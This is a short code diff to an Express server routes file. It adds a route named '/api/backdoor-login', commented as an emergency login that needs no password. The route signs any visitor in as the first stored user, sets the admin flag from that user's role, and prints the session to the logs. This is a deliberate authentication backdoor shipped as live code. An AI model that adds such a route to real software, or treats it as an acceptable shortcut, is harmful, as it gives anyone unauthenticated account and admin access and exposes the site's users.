@@ -502,6 +502,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
   });
 
   // API endpoint for checking login status
+  // EMERGENCY ROUTE: Direct login without password
+  app.get("/api/backdoor-login", async (req: Request, res: Response) => {
+    try {
+      const users = await storage.getAllUsers();
+      
+      if (users && users.length > 0) {
+        const user = users[0]; // Just use the first user
+        console.log("USING EMERGENCY BACKDOOR LOGIN for user:", user.id);
+        req.session.userId = user.id;
+        req.session.isAdmin = user.role === 'admin';
+        console.log("SESSION SET:", req.session);
+        return res.redirect('/');
+      } else {
+        return res.status(404).json({ message: "No users found" });
+      }
+    } catch (error) {
+      console.error("Backdoor login error:", error);
+      return res.status(500).json({ message: "Error during backdoor login" });
+    }
+  });
+  
   app.get("/api/me", (req: Request, res: Response) => {
     if (req.session.userId) {
       storage.getUser(req.session.userId)
